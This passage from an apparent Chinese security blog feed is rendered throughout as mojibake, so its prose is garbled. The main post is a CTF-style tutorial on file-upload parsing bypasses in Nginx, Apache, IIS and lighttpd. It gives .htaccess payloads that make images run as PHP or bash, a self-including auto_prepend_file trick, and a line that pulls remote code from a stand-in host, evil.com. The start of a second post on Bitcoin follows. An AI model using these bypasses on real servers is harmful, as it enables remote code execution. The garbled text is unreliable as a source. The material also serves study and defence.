<p>ç”¨Burp SuiteæŠ“åŒ…å¹¶ä¿®æ”¹ï¼ŒåŸæœ¬çš„URLæ˜¯ï¼š<code>http://192.168.56.101/test.jpgâ€¦php</code> ,å°†jpgåçš„ç¬¬ä¸€ä¸ªâ€œ.â€æ”¹ä¸º20ï¼Œç¬¬äºŒä¸ªâ€œ.â€æ”¹ä¸º00ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194746793-602361880.png" alt="1964477-20200308194746793-602361880"></p>
<p>ä¿®æ”¹å®Œæ¯•å Forword è¯¥è¯·æ±‚ï¼Œåœ¨æµè§ˆå™¨ä¸­çœ‹åˆ°ï¼šAccess denied ï¼Œå¥½å§ï¼Œåˆæ˜¯è¿™ä¸ªã€‚</p>
<p>è¿™è¯´æ˜Nginxåœ¨æ¥æ”¶åˆ°è¿™ä¸€è¯·æ±‚åï¼Œç¡®å®æŠŠæ–‡ä»¶â€œtest.jpg â€å½“åšphpæ–‡ä»¶äº¤ç»™phpå»æ‰§è¡Œäº†ï¼Œåªæ˜¯phpçœ‹åˆ°è¯¥æ–‡ä»¶åç¼€ä¸ºâ€œ.jpg â€è€Œæ‹’ç»æ‰§è¡Œã€‚è¿™æ ·ï¼Œä¾¿éªŒè¯äº†Nginxç¡®å®å­˜åœ¨è¯¥æ¼æ´ã€‚ä½†æ˜¯ç”±äº<code>security.limit_extensions</code>çš„å­˜åœ¨ï¼Œå¯¼è‡´æˆ‘ä»¬å¹¶ä¸èƒ½åˆ©ç”¨æ­¤æ¼æ´</p>
<h2 id="Apacheè§£ææ¼æ´"><a href="#Apacheè§£ææ¼æ´" class="headerlink" title="Apacheè§£ææ¼æ´"></a>Apacheè§£ææ¼æ´</h2><h3 id="æ–‡ä»¶åè§£ææ¼æ´"><a href="#æ–‡ä»¶åè§£ææ¼æ´" class="headerlink" title="æ–‡ä»¶åè§£ææ¼æ´"></a>æ–‡ä»¶åè§£ææ¼æ´</h3><p><code>Apache</code>ä»å³å‘å·¦åˆ¤æ–­è§£ææ–‡ä»¶,è‹¥æ— æ³•è§£æå†ç»§ç»­å‘å·¦åˆ¤æ–­,å¦‚<code>1.php.owf.rar</code>è¿™ä¸ªæ–‡ä»¶åï¼Œ<code>Apache</code>æ— æ³•è§£æ<code>.owf</code>å’Œ<code>.rar</code>ä¸¤ä¸ªåç¼€ï¼Œäºæ˜¯ç»§ç»­å‘å‰è§£æå°†å…¶è§£æä¸º1.php</p>
<p>å®é™…ä¸Šè®¸å¤šåç¼€éƒ½å¯ä»¥è¢«è§£æä¸ºphpæ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œè¿™é‡Œè´´ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« </p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250417211410728.png" alt="image-20250417211410728"></p>
<pre><code class="highlight plaintext">åŸé“¾æ¥:https://www.cnblogs.com/yokan/p/12444476.html
å¯ä»¥ç”¨shell.php/x.php/..ç»•</code></pre>

<h3 id="htaccessæ–‡ä»¶"><a href="#htaccessæ–‡ä»¶" class="headerlink" title=".htaccessæ–‡ä»¶"></a>.htaccessæ–‡ä»¶</h3><p>æ˜¯Apacheä¸‹çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡<code> .htaccess</code>æ–‡ä»¶ï¼Œå¯ä»¥å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½IISå¹³å°ä¸Šä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶é»˜è®¤å¼€å¯ï¼Œå¯ç”¨å’Œå…³é—­åœ¨ <code>httpd.conf</code> æ–‡ä»¶ä¸­é…ç½®ã€‚</p>
<pre><code class="highlight plaintext">ç”Ÿæ•ˆå‰æ:
AllowOverrideè¢«å¯ç”¨/AllowOverride Options FileInfo
mod_rewrite æ¨¡å—å¼€å¯
cgi_moduleè¢«åŠ è½½ã€‚å³apacheé…ç½®æ–‡ä»¶ä¸­æœ‰LoadModule cgi_module modules/mod_cgi.soè¿™ä¹ˆä¸€å¥ä¸”æ²¡æœ‰è¢«æ³¨é‡Š</code></pre>

<p>è¿™é‡Œæ”¾å‡ ä¸ªå¸¸ç”¨çš„é…ç½®</p>
<h4 id><a href="#" class="headerlink" title></a></h4><pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>

<p>è¿™é‡Œä»£ç çš„æ„æ€å¯ä»¥è®© .jpgåç¼€åæ–‡ä»¶æ ¼å¼çš„æ–‡ä»¶åä»¥phpæ ¼å¼è§£æ</p>
<h4 id="CGIå¯åŠ¨æ–¹å¼åˆ©ç”¨"><a href="#CGIå¯åŠ¨æ–¹å¼åˆ©ç”¨" class="headerlink" title="CGIå¯åŠ¨æ–¹å¼åˆ©ç”¨"></a>CGIå¯åŠ¨æ–¹å¼åˆ©ç”¨</h4><pre><code class="highlight plaintext">Options ExecCGI (è¡¨ç¤ºå…è®¸CGIæ‰§è¡Œï¼Œè‹¥AllowOverrideåªæœ‰FileInfoæƒé™ä¸”æœ¬èº«å°±å¼€å¯äº†ExecCGIçš„è¯ï¼Œå°±å¯ä»¥ä¸éœ€è¦è¿™å¥è¯äº†ã€‚)
AddHandler cgi-script .xx(å°†.xxåç¼€çš„æ–‡ä»¶å½“æˆCGIç¨‹åºè§£æ)
#AddHandler application/x-httpd-php .php (ç»™phpåç¼€å¢åŠ äº†å¤„ç†å™¨ï¼Œè¿™æ ·å³ä½¿æœ‰å¤šä¸ªåç¼€ï¼Œåªè¦å«æœ‰phpåç¼€å°±ä¼šè¢«è¯†åˆ«ä¸ºphpæ–‡ä»¶)</code></pre>

<p>ä¸‹é¢æ˜¯ç½‘ä¸Šä¸€ä¸ªå¸ˆå‚…çš„åˆ©ç”¨</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250418083343333.png" alt="image-20250418083343333"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250418083404184.png" alt="image-20250418083404184"></p>
<h4 id="FastCGIåˆ©ç”¨"><a href="#FastCGIåˆ©ç”¨" class="headerlink" title="FastCGIåˆ©ç”¨"></a>FastCGIåˆ©ç”¨</h4><p>ä¾èµ–<code>mod_fcgid.so</code>ï¼Œé»˜è®¤å®‰è£…åŒ…é‡Œæ˜¯æ²¡æœ‰è¿™ä¸ªsoæ–‡ä»¶çš„ï¼Œä½†æ˜¯åœ¨PHPstudyçš„é»˜è®¤é…ç½®ä¸­æ˜¯å·²ç»åŠ è½½äº†çš„ï¼Œå¹¶ä¸”<code>AllowOverrride</code>ä¹Ÿæ˜¯Allæƒé™</p>
<pre><code class="highlight plaintext">Options +ExecCGI
AddHandler fcgid-script .gif
FcgidWrapper &quot;/bin/bash&quot; .gif</code></pre>

<h4 id="æ–‡ä»¶åŒ…å«åˆ©ç”¨"><a href="#æ–‡ä»¶åŒ…å«åˆ©ç”¨" class="headerlink" title="æ–‡ä»¶åŒ…å«åˆ©ç”¨"></a>æ–‡ä»¶åŒ…å«åˆ©ç”¨</h4><p><code>php_value auto_prepend_file +æ–‡ä»¶ç»å¯¹è·¯å¾„</code>ï¼ˆé»˜è®¤æ˜¯å½“å‰ä¸Šä¼ çš„ç›®å½•ï¼‰</p>
<p>é¢„å…ˆåŒ…å«æˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶</p>
<pre><code class="highlight plaintext">php_flag allow_url_include 1
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
#php_value auto_append_file https://evil.com/evil-code.txt</code></pre>

<p>å¦‚æœè‹¥æˆ‘ä»¬é¢„å…ˆåŒ…å«.htaccessæ–‡ä»¶å‘¢?æ•ˆæœæ˜¯æˆ‘ä»¬æ’å…¥çš„æ¶æ„ä»£ç å°±ä¼šè¢«ä»»æ„åŒ…å«</p>
<p>å¤§æ¦‚åƒè¿™æ ·æ„é€ </p>
<pre><code class="highlight plaintext">php_value auto_prepend_file &quot;.htaccess&quot;%0a#&lt;?php phpinfo();?&gt;</code></pre>

<p>åŒæ—¶è¿™ä¸ªæ¼æ´ä¹Ÿå¯ä»¥é€ æˆxssæ¼æ´å’Œå…¶ä»–çš„ä¸€äº›æ–‡ä»¶åŒ…å«æ¼æ´</p>
<h4 id="æ­£ç»å†™å…¥"><a href="#æ­£ç»å†™å…¥" class="headerlink" title="æ­£ç»å†™å…¥"></a>æ­£ç»å†™å…¥</h4><pre><code class="highlight plaintext">#
&lt;IfModule mime_module&gt;
AddHandler php5-script .gif          #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œåªé’ˆå¯¹gifæ–‡ä»¶ä¼šè§£ææˆPhpä»£ç æ‰§è¡Œ
SetHandler application/x-httpd-php    #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œæ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«è§£ææˆphpä»£ç æ‰§è¡Œ
&lt;/IfModule&gt;

#
&lt;FilesMatch &quot;evil.gif&quot;&gt;
SetHandler application/x-httpd-php   #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œå¦‚æœåŒ¹é…åˆ°evil.gifæ–‡ä»¶ï¼Œåˆ™è¢«è§£ææˆPHPä»£ç æ‰§è¡Œ
AddHandler php5-script .gif          #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œå¦‚æœåŒ¹é…åˆ°evil.gifæ–‡ä»¶ï¼Œåˆ™è¢«è§£ææˆPHPä»£ç æ‰§è¡Œ
&lt;/FilesMatch&gt;
è¾ƒä¸ºç²¾å‡†ï¼Œä¸å®¹æ˜“è¯¯ä¼¤
è¿™è¾¹çœ‹åˆ°è¿˜æœ‰ä¸ªå†™æ³•:
&lt;FilesMatch   &quot;shell&quot;&gt; 
SetHandler  application/x-httpd-php 
&lt;/FilesMatch&gt; (æ„æ€æ˜¯æŠŠæ–‡ä»¶åä¸­å«shellçš„éƒ½å½“ä½œphpè§£æï¼ŒåŒ…æ‹¬è¿˜æœ‰ä¸€ä¸ªæ­£åˆ™çš„å†™æ³•)

#
&lt;IfModule mime_module&gt;
AddType application/x-httpd-php .gif (å°†.gifæ–‡ä»¶æŒ‰ç…§phpä»£ç è¿›è¡Œè§£ææ‰§è¡Œ)
AddHandler php5-script .jpg	(å°†.jpgæ–‡ä»¶æŒ‰ç…§phpä»£ç è¿›è¡Œè§£ææ‰§è¡Œ)
Sethandler application/x-httpd-php (å°†è¯¥ç›®å½•åŠå­ç›®å½•ä¸‹çš„æ–‡ä»¶å‡æŒ‰ç…§phpæ–‡ä»¶è§£ææ‰§è¡Œ)
&lt;/IfModule&gt;
å®¹æ˜“è¯¯ä¼¤</code></pre>

<h3 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h3><p>åœ¨æ–‡ä»¶åç¼€ååŠ ä¸Š<code>%0a</code>ï¼Œç»•è¿‡getshell</p>
<h3 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h3><p>é…ç½® <code>Options +Indexes</code> æ—¶Apacheå­˜åœ¨ç›®å½•éå†æ¼æ´ã€‚</p>
<h3 id="lighttpd"><a href="#lighttpd" class="headerlink" title="lighttpd"></a>lighttpd</h3><p><code>xx.jpg/xx.php</code></p>
<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="è§£æç›®å½•è§£ææ¼æ´-test-asp-1-jpg"><a href="#è§£æç›®å½•è§£ææ¼æ´-test-asp-1-jpg" class="headerlink" title="è§£æç›®å½•è§£ææ¼æ´(&#x2F;test.asp&#x2F;1.jpg)"></a>è§£æç›®å½•è§£ææ¼æ´(&#x2F;test.asp&#x2F;1.jpg)</h3><p>åœ¨ IIS5.x&#x2F;6.0 ä¸­ï¼Œåœ¨ç½‘ç«™ä¸‹å»ºç«‹æ–‡ä»¶å¤¹çš„åå­—ä¸º<code>*.aspã€*.asaã€*.cerã€*.cdx </code>çš„æ–‡ä»¶å¤¹ï¼Œé‚£ä¹ˆå…¶ç›®å½•å†…çš„ä»»ä½•æ‰©å±•åçš„æ–‡ä»¶éƒ½ä¼šè¢«IISå½“åšaspæ–‡ä»¶æ¥è§£é‡Šå¹¶æ‰§è¡Œã€‚ä¾‹å¦‚åˆ›å»ºç›®å½• test.aspï¼Œé‚£ä¹ˆ &#x2F;test.asp&#x2F;1.jpg å°†è¢«å½“åšaspæ–‡ä»¶æ¥æ‰§è¡Œã€‚å‡è®¾é»‘å®¢å¯ä»¥æ§åˆ¶ä¸Šä¼ æ–‡ä»¶å¤¹è·¯å¾„ï¼Œå°±å¯ä»¥ä¸ç®¡ä¸Šä¼ åä½ çš„å›¾ç‰‡æ”¹ä¸æ”¹åéƒ½èƒ½æ‹¿shelläº†</p>
<h3 id="æ–‡ä»¶åè§£ææ¼æ´-test-asp-jpg"><a href="#æ–‡ä»¶åè§£ææ¼æ´-test-asp-jpg" class="headerlink" title="æ–‡ä»¶åè§£ææ¼æ´(test.asp;.jpg)"></a>æ–‡ä»¶åè§£ææ¼æ´(test.asp;.jpg)</h3><p>åœ¨ IIS5.x&#x2F;6.0 ä¸­ï¼Œ åˆ†å·åé¢çš„ä¸è¢«è§£æï¼Œä¹Ÿå°±æ˜¯è¯´ xie.asp;.jpg ä¼šè¢«æœåŠ¡å™¨çœ‹æˆæ˜¯xie.aspã€‚è¿˜æœ‰IIS6.0é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†aspè¿˜åŒ…å«è¿™ä¸¤ç§ <code>.asa  .cer</code> ã€‚è€Œæœ‰äº›ç½‘ç«™å¯¹ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œæ ¡éªŒï¼Œåªæ˜¯æ ¡éªŒå…¶åç¼€åã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦ä¸Šä¼  <code>*.asp;.jpgã€*.asa;.jpgã€*.cer;.jpg</code> åç¼€çš„æ–‡ä»¶ï¼Œå°±å¯ä»¥é€šè¿‡æœåŠ¡å™¨æ ¡éªŒï¼Œå¹¶ä¸”æœåŠ¡å™¨ä¼šæŠŠå®ƒå½“æˆaspæ–‡ä»¶æ‰§è¡Œã€‚</p>
<h3 id="ç•¸å½¢è§£ææ¼æ´-test-jpg-php"><a href="#ç•¸å½¢è§£ææ¼æ´-test-jpg-php" class="headerlink" title="ç•¸å½¢è§£ææ¼æ´(test.jpg&#x2F;*.php)"></a>ç•¸å½¢è§£ææ¼æ´(test.jpg&#x2F;*.php)</h3><p>å¾®è½¯å‘å¸ƒäº†IIS7.0ä¿®è¡¥äº†IIS6.0çš„è§£ææ¼æ´ï¼Œæ²¡æƒ³åˆ°IIS7.0çˆ†å‡ºæ›´ä¸¥é‡çš„ç•¸å½¢è§£ææ¼æ´ï¼Œäºæ˜¯å¾®è½¯æ€¥å¿™å‘å¸ƒäº†IIS7.5</p>
<p>åœ¨ IIS7.0ä¸­ï¼Œåœ¨é»˜è®¤Fast-CGIå¼€å¯çŠ¶å†µä¸‹ï¼Œæˆ‘ä»¬å¾€å›¾ç‰‡é‡Œé¢å†™å…¥ä¸‹é¢çš„ä»£ç </p>
<p> <a href="https://img2020.cnblogs.com/i-beta/1964477/202003/1964477-20200308194604304-1865593941.png"><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/kisakiayano/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1964477-20200308194604304-1865593941.png" alt="img"></a></p>
<p>å°†æ–‡ä»¶ä¿å­˜æˆtest.jpgæ ¼å¼ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œå‡è®¾ä¸Šä¼ è·¯å¾„ä¸º&#x2F;uploadï¼Œä¸Šä¼ æˆåŠŸåï¼Œç›´æ¥è®¿é—®&#x2F;upload&#x2F;test.jpg&#x2F;x.phpï¼Œæ­¤æ—¶ç¥å¥‡çš„ç•¸å½¢è§£æå¼€å§‹å‘æŒ¥ä½œç”¨å•¦ã€‚test.jpgå°†ä¼šè¢«æœåŠ¡å™¨å½“æˆphpæ–‡ä»¶æ‰§è¡Œï¼Œæ‰€ä»¥å›¾ç‰‡é‡Œé¢çš„ä»£ç å°±ä¼šè¢«æ‰§è¡Œã€‚æˆ‘ä»¬ä¼šç¥å¥‡çš„å‘ç°åœ¨ &#x2F;upload ç›®å½•ä¸‹åˆ›å»ºäº†ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶<code> shell.php</code> ã€‚</p>
<p>ä¸´æ—¶è§£å†³åŠæ³•ï¼šè®¾ç½®<code> cgi.fix_pathinfo</code>ä¸º0&#96;</p>
<h3 id="å…¶ä»–è§£ææ¼æ´"><a href="#å…¶ä»–è§£ææ¼æ´" class="headerlink" title="å…¶ä»–è§£ææ¼æ´"></a><strong>å…¶ä»–è§£ææ¼æ´</strong></h3><p>åœ¨windowsç¯å¢ƒä¸‹ï¼Œ**xx.jpg[**<strong>ç©ºæ ¼]</strong> æˆ– <strong>xx.jpg.</strong> è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹ï¼Œé»‘å®¢å¯ä»¥é€šè¿‡æŠ“åŒ…ï¼Œåœ¨æ–‡ä»¶åååŠ ä¸€ä¸ªç©ºæ ¼æˆ–è€…ç‚¹ç»•è¿‡é»‘åå•ã€‚è‹¥ä¸Šä¼ æˆåŠŸï¼Œç©ºæ ¼å’Œç‚¹éƒ½ä¼šè¢«windowsè‡ªåŠ¨æ¶ˆé™¤ã€‚</p>
<p>åŒæ—¶æ¨èä¸€ç¯‡æ¯”è¾ƒæœ‰æ„æ€çš„æ–‡ç« ï¼Œlzè‡ªå·±æ²¡æ€ä¹ˆçœ‹æ‡‚ï¼Œä½†æ˜¯æ„Ÿè§‰è›®æœ‰æ„æ€çš„</p>
<p><a href="https://rivers.chaitin.cn/blog/cqr0pg10lne22g7e74ig">Black Hat USA 2024ï¼šåˆ©ç”¨Apache HTTPæœåŠ¡å™¨ä¸­éšè—çš„è¯­ä¹‰æ­§ä¹‰è¿›è¡Œæ”»å‡»ï¼ | é•¿äº­ç™¾å·äº‘</a></p>
]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>æ™ºèƒ½åˆçº¦æ·±åº¦å­¦ä¹ ï¼ˆæŒç»­æ–½å·¥ingï¼‰</title>
    <url>/2024/12/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%96%BD%E5%B7%A5ing%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<h1 id="æ™ºèƒ½åˆçº¦æ·±åº¦å­¦ä¹ "><a href="#æ™ºèƒ½åˆçº¦æ·±åº¦å­¦ä¹ " class="headerlink" title="æ™ºèƒ½åˆçº¦æ·±åº¦å­¦ä¹ "></a>æ™ºèƒ½åˆçº¦æ·±åº¦å­¦ä¹ </h1></blockquote>
<h1 id="å‰åº"><a href="#å‰åº" class="headerlink" title="å‰åº"></a>å‰åº</h1><blockquote>
<p><strong>å¦‚æœæƒ³ç›´æ¥å…¥æ‰‹åˆçº¦ï¼Œå¯ä»¥ç›´æ¥è·³è‡³åˆçº¦å¼€å‘æ¨¡å—å“¦</strong></p>
</blockquote>
<p>åœ¨è¿›å…¥æ™ºèƒ½åˆçº¦å­¦ä¹ ç¯èŠ‚ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹å®ƒçš„â€œçˆ¹â€ï¼Œå³<strong>åŒºå—é“¾</strong></p>
<p>åŒºå—é“¾ï¼Œæ˜¯ä¸€ç§åŒºä¸­å¿ƒåŒ–ï¼Œç‚¹å¯¹ç‚¹ç³»ç»Ÿçš„å·¥å…·ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯ä¸€ç§æ•°æ®åº“ç³»ç»Ÿï¼ˆå®é™…ä¸Šå°±æ˜¯ä¸€æœ¬è®°å½•å„ç§äº¤æ˜“çš„è´¦æœ¬ï¼‰</p>
<p>åŒºåˆ«äºä¼ ç»Ÿçš„ä¸­å¿ƒåŒ–ç³»ç»Ÿï¼Œè¿™ä¸ªç³»ç»Ÿç”±å„ä¸ªåŒºå—ï¼ˆå‰åŒºå—çš„åŠ å¯†å“ˆå¸Œï¼Œæ—¶é—´æˆ³ï¼Œäº¤æ˜“æ•°æ®ï¼‰ç»„æˆï¼Œåœ¨è¿™ä¸ªç³»ç»Ÿä¸­ï¼Œç”±ç½‘ç»œä¸­çš„å¤§å¤šæ•°èŠ‚ç‚¹æ¥å†³å®šæ–°åŒºå—ä¸­äº¤æ˜“è®°å½•çš„å½•å…¥ä»¥åŠä¿®æ”¹ã€‚è¿™å°±ä½¿å¾—å…¶å®‰å…¨æ€§è¿œè¿œè¶…è¿‡äº†ä¼ ç»Ÿçš„ç³»ç»Ÿã€‚å‡è®¾ä¸€ä¸ªç”¨æˆ·æƒ³è¦ä¼ªé€ ä¸€ä»½äº¤æ˜“ï¼Œé‚£ä¹ˆä»ç†è®ºæ¥è¯´ä»–éœ€è¦ä¿®æ”¹å…¨ç½‘æ¯ä¸ªèŠ‚ç‚¹çš„æ€»è´¦ï¼Œè¿™ä¸ªè¿‡ç¨‹éœ€è¦æ¶ˆè€—å·¨é‡çš„ç®—åŠ›<del>æœ‰è¿™ç®—åŠ›è°è¿˜æ¥ä¼ªé€ äº¤æ˜“å•Š</del>ï¼Œæ¯å¢åŠ ä¸€ä¸ªåŒºå—ï¼Œéœ€è¦å…¨ç½‘51%ä»¥ä¸Šçš„èŠ‚ç‚¹çš„è®¤å¯æ‰èƒ½å¤Ÿç»„æˆåŒºå—é“¾</p>
<p>é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨æ›´å…·ä½“ä¸€ç‚¹ï¼Œæ¥è°ˆä¸€ä¸ªå®¶å–»æˆ·æ™“çš„åŒºå—é“¾ç³»ç»Ÿâ€”â€”â€”æ¯”ç‰¹å¸ç³»ç»Ÿ</p>
<h1 id="å…³äºæ¯”ç‰¹å¸ç³»ç»Ÿ"><a href="#å…³äºæ¯”ç‰¹å¸ç³»ç»Ÿ" class="headerlink" title="å…³äºæ¯”ç‰¹å¸ç³»ç»Ÿ"></a>å…³äºæ¯”ç‰¹å¸ç³»ç»Ÿ</h1><h2 id="ç«äº‰è®°è´¦"><a href="#ç«äº‰è®°è´¦" class="headerlink" title="ç«äº‰è®°è´¦"></a>ç«äº‰è®°è´¦</h2><p>å³æŒ–çŸ¿ï¼Œåœ¨ä¸€ä¸ªåŒºå—å»ºç«‹ä¹‹åï¼Œç«äº‰è®°è´¦çš„èŠ‚ç‚¹éœ€è¦è®¡ç®—å»ºç«‹ä»¥æ¥æ‰€æœ‰äº¤æ˜“çš„å“ˆå¸Œå€¼ï¼ˆ<strong>SHA256</strong>ï¼‰ï¼Œå†å°†å…¶ä¸¤ä¸¤ç»„åˆï¼Œä¸æ–­é‡å¤ï¼Œæœ€ç»ˆå¾—åˆ°ä¸€ä¸ªSHA256å€¼ï¼ˆä¹Ÿå«<strong>é»˜å…‹æ ¹</strong>ï¼‰ï¼Œæœ€åéœ€è¦è¿›è¡Œä»¥ä¸‹è®¡ç®—</p>
<pre><code class="highlight plaintext">SHA256(é»˜å…‹æ ¹+å‰ä¸€åŒºçš„ID+ä¸€ä¸ªéšæœºæ•°)</code></pre>

<p>é€šå¸¸è¿™ä¸ªå€¼è¦æ»¡è¶³å“ˆå¸Œå€¼çš„å‰20ä½ä¸º0(è¾¾æˆæ¦‚ç‡åœ¨ç™¾ä¸‡åˆ†ä¹‹ä¸€æ°´å¹³),ä¹Ÿå°±æ˜¯ç®—åŠ›æ¯”æ‹¼</p>
<p>æˆåŠŸè€…å‘å…¨ç½‘å‘é€é€šçŸ¥ï¼Œè‹¥ç»è¿‡æ£€éªŒå¤§å®¶å°±å…¬è®¤ä»–æ„é€ çš„è¿™ä¸ªåŒºå—å¹¶ä»¥å…¶ä½œä¸ºçˆ¶åŒºå—ï¼Œè¿›è¡Œä¸‹ä¸€ä¸ªåŒºå—çš„ç®—åŠ›ç«äº‰ï¼ˆæ¯10åˆ†é’Ÿè¿›è¡Œä¸€æ¬¡ï¼‰</p>
<p>æˆåŠŸè€…ä¼šè·å¾—12.5ä¸ªæ¯”ç‰¹å¸<del>122wç¾åˆ€(2024.12.9æ—¥æ±‡ç‡)</del>ä½œä¸ºå¥–åŠ±ï¼Œè¿™å°±æ˜¯ä¸­æœ¬èªè®¾è®¡çš„æ¿€åŠ±æœºåˆ¶<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e23cc007503b1060aa2f3f307de43b14.png" alt="img"></p>
<h2 id="é•¿é“¾ä¸çŸ­é“¾"><a href="#é•¿é“¾ä¸çŸ­é“¾" class="headerlink" title="é•¿é“¾ä¸çŸ­é“¾"></a>é•¿é“¾ä¸çŸ­é“¾</h2><p>åˆæ˜¯ç®—åŠ›ç«äº‰â€¦â€¦åœ¨å‘å…¨ç½‘é€šçŸ¥æ—¶ï¼ˆå‡è®¾ä½ çš„ç­”æ¡ˆæ­£ç¡®ï¼‰ï¼Œå¯èƒ½ä¼šæœ‰äººä¸ä½ åœ¨ç›¸åŒçš„æ—¶é—´å‘é€äº†æ­£ç¡®çš„ç­”æ¡ˆï¼Œäºæ˜¯ä¼šå‡ºç°ä¸¤æ¡é“¾ï¼Œé‚£ä¹ˆå°±åˆåˆ°äº†æ‹¼ç®—åŠ›çš„æ—¶å€™äº†ï¼Œä¸åŒçš„çŸ¿å·¥ä¼šé€‰æ‹©ä¸åŒçš„é“¾ç»§ç»­ä¸‹ä¸€è½®åŒºå—è®¡ç®—ï¼Œè¿™é‡Œå°±ä¸å¾—ä¸æå¦ä¸€ç§æœºåˆ¶äº†ï¼Œå³<strong>æ€»æ˜¯é€‰æ‹©å·¥ä½œé‡æœ€å¤§çš„é“¾</strong>ï¼Œäºæ˜¯å“ªæ¡é“¾å…ˆå‡ºç°ä¸‹ä¸€ä¸ªåŒºå—ï¼Œä¹Ÿå°±æ„å‘³ç€ä¼šæœ‰æ›´å¤šçš„çŸ¿å·¥é€‰æ‹©è¿™æ¡é“¾å·¥ä½œï¼Œé‚£ä¹ˆå¦ä¸€æ¡çŸ­é“¾å°±ä¼šè¢«åºŸæ­¢ã€‚ç»„è£…çŸ­é“¾çš„çŸ¿å·¥ä¹Ÿå¾—ä¸åˆ°æ¯”ç‰¹å¸å¥–åŠ±ï¼Œç»“æœå°±æ˜¯åŒºå—é“¾åªæœ‰å”¯ä¸€ä¸€æ¡ä¸»çº¿ã€‚</p>
<h2 id="æ¯”ç‰¹å¸çš„äº¤æ˜“"><a href="#æ¯”ç‰¹å¸çš„äº¤æ˜“" class="headerlink" title="æ¯”ç‰¹å¸çš„äº¤æ˜“"></a>æ¯”ç‰¹å¸çš„äº¤æ˜“</h2><p>äº¤æ˜“åŒ…æ‹¬ä¸¤ä¸ªæ–¹å‘ï¼ŒInputä»¥åŠOutput.</p>
<p>ä¸¤è€…å¯ä»¥ä¸å®Œå…¨ä¸€è‡´ï¼Œä½†åªèƒ½è¾“å…¥ç•¥å¤§äºè¾“å‡ºï¼Œé‚£ä¹ˆç¼ºå°‘çš„è¿™éƒ¨åˆ†å»å“ªé‡Œäº†å‘¢ ï¼Œæ˜¯æ”¯ä»˜ç»™äº†çŸ¿å·¥å“¦ï¼Œæ¯ç¬”äº¤æ˜“åœ¨å‘å¸ƒåå¯ä»¥é€‰æ‹©æ”¯ä»˜äº¤æ˜“è´¹ç”¨ï¼Œé’±åˆ°ä½äº¤æ˜“ä¹Ÿä¼šæ›´å¿«è¢«æ‰“åŒ…ã€‚ä½†æ˜¯ä¸ä»£è¡¨ä¸æ”¯ä»˜æˆ–æ”¯ä»˜å¾ˆå°‘äº¤æ˜“è´¹ç”¨ä¸ä¼šæœ‰äººå¤„ç†ä½ çš„äº¤æ˜“ï¼Œåªæ˜¯ä¼šè¢«æ¨è¿Ÿï¼Œæ€»ä¹‹ï¼Œä¸ç®¡æ˜¯å¦æ”¯ä»˜äº¤æ˜“è´¹ç”¨ï¼ŒçŸ¿å·¥éƒ½ä¼šè·å¾—æ¯”ç‰¹å¸çš„å¥–åŠ±ï¼Œä½ å¯ä»¥å°†å…¶ç†è§£ä¸ºï¼š<strong>å³ä½¿ä½ ä¸ä»˜ç»™æœåŠ¡å‘˜å°è´¹ï¼Œä½†å¹¶ä¸å½±å“ä»–è·å¾—å·¥èµ„</strong>ã€‚</p>
